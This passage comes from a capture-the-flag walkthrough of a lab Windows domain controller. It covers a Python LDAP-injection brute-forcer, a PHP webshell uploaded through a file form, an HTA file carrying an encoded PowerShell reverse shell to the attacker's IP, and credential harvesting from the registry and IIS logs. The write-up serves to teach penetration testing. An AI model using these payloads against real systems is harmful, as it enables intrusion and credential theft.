Having just a string will fail when accessed by multiple workers, but this works fine. It loads the queue with all the possible first characters, as the first time through the loop `temp_value` is empty. It creates workers, and waits for them to empty the queue, and uses `None` in the queue to exit, just like above.

But rather than be done, I have to account for the possibility that I’m not done, but rather I hit a “\*” in the value. I’ll save the potential solution as `temp_value`, and loop again, adding in “\*” and then all possible next characters. This allows me to continue testing. If i find something, it was a start, and `value.value` will be different from `temp_value` when it gets back. If not, then it breaks the loop and prints the result.

`worker` has an extra check as well:

```

async def worker(queue, result, client):
    while True:
        str_to_check = await queue.get()
        if str_to_check is None:
            queue.task_done()
            break
        if not str_to_check.startswith(result.value):
            queue.task_done()
            continue
        exact_match = await test_str(client, str_to_check)
        if exact_match is not None:
            if len(str_to_check) > len(result.value) or len(str_to_check) == len(result.value) and result.value[-1] == quote('*'):
                print(f"\r{str_to_check}", end="")
                result.value = str_to_check
                if exact_match is False:
                    for l in alphabet:
                        queue.put_nowait(f'{str_to_check}{quote(l)}')

        queue.task_done()

```

At the top, it checks that the string about to be checked starts with the current longest known starting string. If I know the string starts “abd”, there’s no point in checking “abc” that might have been added to the queue.

When checking matches, I make this check again, as `result.value` could have updated while `await`ing the network call.

`test_str` is the same.

The final code is:

```

#!/usr/bin/env python3

import asyncio
import httpx
import sys
from dataclasses import dataclass
from string import printable
from urllib.parse import quote, unquote

@dataclass
class Result:
    value: str = ''

alphabet = [c for c in printable[:-5] if c not in '()']

async def test_str(client, str_to_check) -> bool|None:
    resp = await client.get(f'http://internal.analysis.htb/users/list.php?name={username})({field}={str_to_check}*')
    if "Search result" not in resp.text or "CONTACT_" in resp.text:
        return None
    resp2 = await client.get(f'http://internal.analysis.htb/users/list.php?name={username})({field}={str_to_check}')
    if "Search result" not in resp.text or "CONTACT_" in resp2.text:
        return False
    return True

async def worker(queue, result, client):
    while True:
        str_to_check = await queue.get()
        if str_to_check == quote("97N"):
            pass #breakpoint()
        if str_to_check is None:
            queue.task_done()
            break
        if not str_to_check.startswith(result.value):
            queue.task_done()
            continue
        exact_match = await test_str(client, str_to_check)
        if exact_match is not None:
            if len(str_to_check) > len(result.value) or len(str_to_check) == len(result.value) and result.value[-1] == quote('*'):
                print(f"\r{str_to_check}", end="")
                result.value = str_to_check
                if exact_match is False:
                    for l in alphabet:
                        queue.put_nowait(f'{str_to_check}{quote(l)}')

        queue.task_done()

async def main():
    async with httpx.AsyncClient() as client:
        queue = asyncio.Queue()
        temp_value = ''
        value = Result()
        print(f'[*] Brute-forcing {field} for {username}...')
        while True:
            for letter in alphabet:
                queue.put_nowait(f'{temp_value}{quote(letter)}')

            workers = [asyncio.create_task(worker(queue, value, client)) for _ in range(50)]

            await queue.join()

            for _ in workers:
                queue.put_nowait(None)

            await asyncio.gather(*workers)

            if temp_value == f'{value.value}*':
                break
            temp_value = value.value + '*'

        print(f"\r[+] {username}'s {field}: {value.value}")

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <user> <field>")
    exit(1)

username = sys.argv[1]
field = sys.argv[2]
asyncio.run(main())

```

This runs pretty fast, brute forcing badam’s `sn` in less than three seconds:

```

oxdf@hacky$ time python ldap_get_field.py badam sn
[*] Brute-forcing sn for badam...
[+] badam's sn: adam

real    0m2.653s
user    0m0.726s
sys     0m0.119s

```

#### Recover Password

It is not uncommon to store the password for an account, especially a shared account, in the `description` field in LDAP. This was part of the intended path of the [Support](/2022/12/17/htb-support.html#recover-ldap-password) machine I authored. technician sounds like a shared account, and there’s something password-like in the `description` field:

```

oxdf@hacky$ time python ldap_get_field.py technician description
[*] Brute-forcing description for technician...
[+] technician's description: 97NTtl*4QP96Bv

real    0m8.866s
user    0m1.828s
sys     0m0.281s

```

It does have a “\*” in the result, making that hacky work-around necessary.

That password works for SMB:

```

oxdf@hacky$ netexec smb analysis.htb -u technician -p '97NTtl*4QP96Bv'
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv 

```

Unfortunately it doesn’t work for WinRM:

```

oxdf@hacky$ netexec winrm analysis.htb -u technician -p '97NTtl*4QP96Bv'
WINRM       10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\technician:97NTtl*4QP96Bv

```

There’s also nothing of interest on the SMB shares:

```

oxdf@hacky$ netexec smb analysis.htb -u technician -p '97NTtl*4QP96Bv' --shares
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv 
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Enumerated shares
SMB         10.10.11.250    445    DC-ANALYSIS      Share           Permissions     Remark
SMB         10.10.11.250    445    DC-ANALYSIS      -----           -----------     ------
SMB         10.10.11.250    445    DC-ANALYSIS      ADMIN$                          Administration à distance
SMB         10.10.11.250    445    DC-ANALYSIS      C$                              Partage par défaut
SMB         10.10.11.250    445    DC-ANALYSIS      IPC$            READ            IPC distant
SMB         10.10.11.250    445    DC-ANALYSIS      NETLOGON        READ            Partage de serveur d'accès 
SMB         10.10.11.250    445    DC-ANALYSIS      SYSVOL          READ            Partage de serveur d'accès 

```

Entering “technician@analysis.htb” and “97NTtl\*4QP96Bv” at the `/employees/login.php` page does work:

![image-20240530143738645](/img/image-20240530143738645.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

### Enumerate Dashboard

#### Dashboard

The main page of the dashboard mentions a ticket system and a SOC security report system:

![image-20240530144240541](/img/image-20240530144240541.png)

There are some chats, but they aren’t clickable and don’t show anything interesting.

#### Tickets

The tickets page has five tickets:

![image-20240530144334367](/img/image-20240530144334367.png)

Viewing a ticket in detail shows the “Details” field:

![image-20240530144409986](/img/image-20240530144409986.png)

There is one reference to HTA files:

![image-20240530144456896](/img/image-20240530144456896.png)

#### SOC Report

This page offers an upload form:

![image-20240530145950377](/img/image-20240530145950377.png)

If I upload a simple image file, it shows the same form with an “File is safe.” message, implying that it was analyzed or even run:

![image-20240530150026376](/img/image-20240530150026376.png)

Interestingly, that file is now available in `/dashboard/uploads`:

![image-20240530150058344](/img/image-20240530150058344.png)

That path is also given in the response to the upload:

```

HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: http://internal.analysis.htb/dashboard/form.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.2.5
Date: Thu, 30 May 2024 19:04:56 GMT
Connection: close
Content-Length: 18

uploads/htb.png

```

#### Emergency

This panel offers a way to send email to employees:

![image-20240530150602422](/img/image-20240530150602422.png)

Entering an email and some text and sending pops a message:

![image-20240530150639057](/img/image-20240530150639057.png)

I could test this for XSS, but I don’t need to.

### Execution

#### Overview

There are two ways to get execution from this webpage:

```

flowchart TD;
    A[<a href='#soc-report'>SOC Report</a>]-->B(<a href='#via-php-webshell'>PHP Webshell</a>);
    B-->C[Shell as svc_web];
    A-->D(<a href='#via-hta'>HTA Upload</a>);
    D-->C;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### via PHP Webshell

I’ve already identified that uploaded files go to `/dashboard/uploads`, and that this site is PHP. I’ll make a simple PHP webshell:

```

<?php system($_REQUEST['cmd']); ?>

```

I’ll upload this via the SOC reports, and find it in Firefox:

![image-20240530151202324](/img/image-20240530151202324.png)

That’s execution. I’ll grab a “Powershell #3 (Base64)” webshell from [revshells.com](https://www.revshells.com/) and make it the command:

![image-20240530151338051](/img/image-20240530151338051.png)

It hangs, but at `nc`:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.250 65372

PS C:\inetpub\internal\dashboard\uploads> whoami
analysis\svc_web

```

#### Via HTA

Given the reference to HTA files in the tickets, I can try uploading an HTA file. I don’t think this is very well hinted at, which is why everyone I know of took the PHP webshell route.

I’ll create an HTA that runs VBScript code, which just creates a `shell` object to call a PowerShell webshell:

```

<!DOCTYPE html>
<html>
<body>
    <script type="text/vbscript">
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA", 0, False
    </script>
</body>
</html>

```

When I upload it, there’s a shell at `nc`:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.250 65406

PS C:\inetpub\internal\dashboard>

```

## Shell as jdoe

### Enumeration

#### Users

There are a bunch of users on this box:

```

PS C:\> net user

comptes d'utilisateurs de \\DC-ANALYSIS
-------------------------------------------------------------------------------
Administrateur           amanson                  badam                    
cwilliams                Invit?                   jangel                   
jdoe                     krbtgt                   lzen                     
soc_analyst              svc_web                  technician               
webservice               wsmith                   
La commande s'est termin?e correctement.

```

Only a handful that have home directories:

```

PS C:\users> ls

    R?pertoire?: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/01/2024     10:33                Administrateur
d-----       05/01/2024     21:29                jdoe
d-r---       07/05/2023     21:44                Public
d-----       26/05/2023     11:02                soc_analyst
d-----       26/05/2023     14:20                webservice
d-----       23/05/2023     10:10                wsmith

```

I’m not able to access any but `Public`, and there’s nothing interesting there.

#### Find Password

I’ll show two ways to find the password for jdoe:

```

flowchart TD;
    A[Shell as web_svc]-->B(<a href='#via-autologon'>AutoLogon</a>);
    B-->C[jdoe Creds];
    A-->D(<a href='#via-web-logs'>Web Logs</a>);
    D-->C;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### Via Autologon

A common thing to look for on Windows machines is credentials stored in the registry for auto-logon. Enumeration scripts like [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will identify these as well. They are easily read with PowerShell:

```

PS C:\> cd HKLM:
PS HKLM:\> cd "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
PS HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon> Get-ItemProperty . | Select-Object DefaultDomainName, DefaultUserName, DefaultPassword

DefaultDomainName DefaultUserName DefaultPassword
----------------- --------------- ---------------
analysis.htb.     jdoe            7y4Z4^*y9Zzj  

```

#### Via Web Logs

In the `dashboard` directory, there are files that I hadn’t identified in enumerating the site:

```

PS C:\inetpub\internal\dashboard> ls

    R?pertoire?: C:\inetpub\internal\dashboard

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/06/2023     10:01                css
d-----       12/06/2023     10:01                img
d-----       12/06/2023     10:01                js
d-----       12/06/2023     10:01                lib
d-----       12/06/2023     10:01                scss
d-----       30/05/2024     21:19                uploads
-a----       13/05/2023     21:17          13143 404.html
-a----       19/12/2023     15:24           9129 alert_panel.php
-a----       13/05/2023     21:17          80928 bootstrap-admin-template-free.jpg
-a----       14/12/2023     14:02          12437 details.php
-a----       14/12/2023     13:41          10197 emergency.php
-a----       14/12/2023     14:05           9570 form.php
-a----       14/12/2023     13:31          18768 index.php
-a----       13/05/2023     21:17           1422 LICENSE.txt
-a----       19/05/2023     18:08            302 logout.php
-a----       15/09/2018     09:12          14848 mshta.exe
-a----       13/05/2023     21:17            538 READ-ME.txt
-a----       20/05/2023     10:08            547 rule_custom.yara
-a----       20/05/2023     09:46            360 rule_meterpreter.yara
-a----       14/12/2023     13:52          11494 tickets.php
-a----       14/12/2023     19:01           2091 upload.php
-a----       21/04/2023     07:39        2406912 yara64.exe

```

The Yara rules are likely run against files to see if they are malicious. `alert_panel.php` is new.

There’s a lot of HTML here, but the PHP parts are interesting:

```

    <?php
    if (isset($_GET['auth']) && isset($_GET['username']) && isset($_GET['password']) && isset($_GET['alert'])) {
        $alertMessage = htmlspecialchars($_GET['alert'], ENT_QUOTES, 'UTF-8');
        echo '<div class="alert alert-danger" role="alert">' . $alertMessage . '</div>';
    } else{
    ?>

    <div class="alert alert-success" role="alert">No new security alert</div>

    <?php
    }
    ?>  

```

It’s checking for `username` and `password` fields in the GET parameters. This is a good way to take creds, because they end up in web logs.

There’s a `logs` directory in `C:\inetpub`:

```

PS C:\inetpub> ls

    R?pertoire?: C:\inetpub

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       26/05/2023     10:43                custerr
d-----       19/12/2023     16:50                history
d-----       19/12/2023     15:21                internal
d-----       08/05/2023     09:59                logs
d-----       08/05/2023     09:30                temp
d-----       08/07/2023     11:24                wwwroot

```

In `logs\LogFiles`, there are two directories:

```

PS C:\inetpub\logs\LogFiles> ls

    R?pertoire?: C:\inetpub\logs\LogFiles

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       08/01/2024     15:39                W3SVC1
d-----       10/01/2024     12:30                W3SVC2

```

`WSSVC2` is for the `internal` site. It has a single long file:

```

PS C:\inetpub\logs\LogFiles\W3SVC2> ls

    R?pertoire?: C:\inetpub\logs\LogFiles\W3SVC2

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       30/05/2024     21:46       69986364 u_ncsa1.log

```

Because I’m interested in this `alert_panel.php`, I’ll use some `findstr` commands (like `grep` on Linux) to get only these logs:

```

PS C:\inetpub\logs\LogFiles\W3SVC2> findstr alert_panel.php u_ncsa1.log
127.0.0.1 - - [29/May/2024:20:12:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:20:14:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:20:42:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:20:44:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:21:28:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:22:12:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:22:56:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [29/May/2024:23:40:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:00:24:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:01:08:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:01:52:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:02:36:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:03:20:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:04:04:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:04:48:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:05:32:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:06:16:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:07:00:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:07:44:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:08:28:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:09:12:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:09:56:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:10:40:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:11:24:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:12:08:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:12:52:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:13:36:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:14:20:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:15:04:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:15:48:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:16:32:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:17:16:01 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:18:00:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:18:44:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:19:28:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:20:12:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:20:34:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:21:18:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:21:36:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
127.0.0.1 - - [30/May/2024:21:38:02 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
10.10.14.6 - - [30/May/2024:21:45:37 +0200] "GET /dashboard/alert_panel.php HTTP/1.1" 200 8902

```

Other than one log from me at the end, there’s a bunch of times with jdoe’s password!

### WinRM

#### Validate Creds

These creds work for SMB:

```

oxdf@hacky$ netexec smb analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj 

```

They also work for WinRM:

```

oxdf@hacky$ netexec winrm analysis.htb -u jdoe -p '7y4Z4^*y9Zzj' 
WINRM       10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)

```

#### Shell

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) gets a shell:

```

oxdf@hacky$ evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents>

```

And `user.txt`:

```
*Evil-WinRM* PS C:\Users\jdoe\desktop> type user.txt
7cf4719b************************

```

## Shell as Administrateur

### Enumeration

#### File System

The system root has two interesting directories and a file:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/12/2023  10:01 AM                inetpub
d-----        11/5/2022   8:14 PM                PerfLogs
d-----         5/8/2023  10:20 AM                PHP
d-----         7/9/2023  10:54 AM                private
d-r---       11/18/2023   9:56 AM                Program Files
d-----         5/8/2023  10:11 AM                Program Files (x86)
d-----         7/9/2023  10:57 AM                Snort
d-r---        5/26/2023   2:20 PM                Users
d-----        1/10/2024   3:52 PM                Windows
-a----        5/30/2024   9:58 PM         484548 snortlog.txt

```

`private` has a single text file:

```
*Evil-WinRM* PS C:\private> ls

    Directory: C:\private

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/26/2023   9:44 AM            576 encoded.txt
*Evil-WinRM* PS C:\private> type encoded.txt
-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCq0jPQTxt+3BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK
0kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu
pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
=a7bc
-----END ENCODED MESSAGE-----

```

This is related to the intended path to escalate that I haven’t done yet.

There is also a `Snort` directory, which contains a copy of the [Snort IDS](https://www.snort.org/), as well as a log file, `snortlog.txt`. The log file doesn’t have anything interesting, but the date is updating constantly implying that Snort is running.

#### Snort Configuration

In `C:\snort\etc` there’s the `snort.conf` file:

```
*Evil-WinRM* PS C:\snort\etc> ls

    Directory: C:\snort\etc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/20/2022   4:15 PM           3757 classification.config
-a----        4/20/2022   4:15 PM          23654 file_magic.conf
-a----        4/20/2022   4:15 PM          33339 gen-msg.map
-a----        4/20/2022   4:15 PM            687 reference.config
-a----         7/8/2023   9:34 PM          23094 snort.conf
-a----        4/20/2022   4:15 PM           2335 threshold.conf
-a----        4/20/2022   4:15 PM         160606 unicode.map

```

One of the interesting directives for Snort is how it can [load dynamic modules](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html). The keyword `dynamicpreprocessor` is interesting:

> Tells snort to load the dynamic preprocessor shared library (if file is used) or all dynamic preprocessor shared libraries (if directory is used). Specify `file`, followed by the full or relative path to the shared library. Or, specify `directory`, followed by the full or relative path to a directory of preprocessor shared libraries. (Same effect as `-dynamic-preprocessor-lib` or `-dynamic-preprocessor-lib-dir` options).

On Analysis, that’s specified as `C:\Snort\lib\snort_dynamicpreprocessor`:

```
*Evil-WinRM* PS C:\snort\etc> findstr dynamicpreprocessor *
snort.conf:dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor

```

The permissions on this folder are:

```
*Evil-WinRM* PS C:\Snort\lib> icacls snort_dynamicpreprocessor
snort_dynamicpreprocessor AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
                          BUILTIN\Administrateurs:(I)(OI)(CI)(F)
                          BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
                          BUILTIN\Utilisateurs:(I)(CI)(AD)
                          BUILTIN\Utilisateurs:(I)(CI)(WD)
                          CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

```

